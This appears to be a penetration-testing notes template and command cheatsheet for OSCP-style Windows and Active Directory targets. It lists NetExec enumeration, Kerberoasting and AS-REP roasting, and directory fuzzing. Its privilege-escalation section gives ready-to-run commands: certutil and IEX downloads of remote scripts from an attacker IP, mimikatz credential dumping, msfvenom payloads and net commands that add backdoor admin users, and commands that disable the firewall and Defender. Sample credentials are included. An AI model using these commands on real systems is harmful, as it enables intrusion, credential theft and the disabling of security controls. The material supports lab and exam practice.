## IP: 
___
## Nmap TCP

```bash
```
## Nmap UDP

```bash
```

___
## Initial Checks:

`export IP={IP}`

`nxc smb $IP -u '' -p '' --generate-hosts-file hosts`
`nxc smb $IP -u '' -p '' --generate-krb5-file krb5.conf`
`sudo ntpdate $IP`
`nxc smb $IP -u '' -p ''`
`nxc smb $IP -u 'guest' -p ''`
`nxc ldap $IP -u 'guest' -p '' -M get-desc-users`
`nxc ldap $IP -u '' -p '' -M get-desc-users`

**If any work go for:**

`--shares`

`-M gpp_password`

`-M gpp_autologin`

`-M powershell_history`

`-M keepass_discover`

`-M recyclebin`

`-M spider_plus --share 'SHARE_NAME'`

`--rid-brute | grep SidTypeUser | cut -d "\\" -f 2 | cut -d " " -f 1 | grep -v \\$ > users`

`--users-export users`

`nxc ldap $IP -u <u> -p <p> --asreproast asreproast.out`

`nxc ldap $IP -u <u> -p <p> --kerberoasting kerberoasting.out`

`nxc ldap $IP -u <u> -p <p> --no-preauth-targets users --kerberoasting output.txt` 

Creds found:

`--shares`

`nxc ldap <ip> -u user -p pass --bloodhound --collection All --dns-server <IP_DC>`

`kerbrute userenum --dc 192.168.107.162 -d sub.poseidon.yzx /opt/SecLists/Usernames/xato-net-10-million-usernames.txt`

`impacket-GetNPUsers sub.poseidon.yzx/ -no-pass -usersfile users -dc-ip 192.168.107.162`

`GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip 10.10.109.146 'oscp.exam/eric.wallows:EricLikesRunning800' -request`

`GetNPUsers.py -dc-ip 192.168.193.158 -dc-host zeus.corp 'zeus.corp/db_user:Password123!' -request`

# Initial Access
### Ports Open:

### 80
#### Nikto:

```bash
```
#### Wappalyzer:


#### Source Code:
#### Directories Fuzzing 

**Cheatsheet:**

```
===DIRECTORY FUZZING:
gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -k -t 30 --random-agent --exclude-length 6765

===DIRECTORY FUZZING:
ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v

===AUTHENTICATED FUZZING DIRECTORIES:
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 -d "SESSIONID=value" "$URL"

===FUZZ Directories:
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "$URL"

Also try: /opt/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
/opt/SecLists/Discovery/Web-Content/common.txt
```

**Result:**

```bash
```
#### Files Fuzzing (add extensions)

**Cheatsheet:**

```
===AUTHENTICATED FILE FUZZING:
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -d "SESSIONID=value" "$URL"


===FILE FUZZING:
gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -k -t 30 -x php,html,htm --random-agent --exclude-length 6765
```

**Result:**

```bash
```

`ffuf -request ~/boxes/aoc/brute -request-proto http -w numbers`
# Privilege Escalation

### Windows:
Penelope:
`run upload_privesc_scripts`
`run upload_credump_scripts`
`run ligolo`

certutil.exe -urlcache -split -f http://<Our_IP>:8080/shell.bat shell.bat

.\mimikatz.exe "log" "privilege::debug" "token::elevate" "lsadump::lsa /inject" "sekurlsa::logonpasswords" exit

IEX(IWR http://192.168.45.212/PrivescCheck.ps1 -UseBasicParsing); Invoke-PrivescCheck

powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Risky -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"

PS C:\Users\Public> . .\PowerUp.ps1; Invoke-AllChecks

winPEAS colors - REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1

(Get-PSReadlineOption).HistorySavePath
`C:\Users\[user]\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine`

Unusual binaries on C:/Users/* ? transfer to kali and use strings

Don't forget to look for `windows.old`

`Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`

Add admin:

```
net user itzvenom Password123! /add && net localgroup administrators itzvenom /add
```

```
msfvenom -p windows/exec CMD='net localgroup administrators yoshi /add' -f exe > command.exe
```

```
msfvenom -p windows/adduser USER=itzvenom PASS='P@ssw0rd!' -f exe > adduser.exe

runas /user:itzvenom cmd
Enter the password for itzvenom:
Attempting to start cmd as user "DEV04\itzvenom" ...
```

```
net user [username] [new password]
```

Disable firewall/AV:

```
netsh advfirewall set allprofiles state off
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath "C:\Windows\Temp"
```

whoami; hostname; ipconfig; type C:\Users\Administrator\Desktop\proof.txt
whoami; hostname; ipconfig; type C:\Users\Administrator\Desktop\local.txt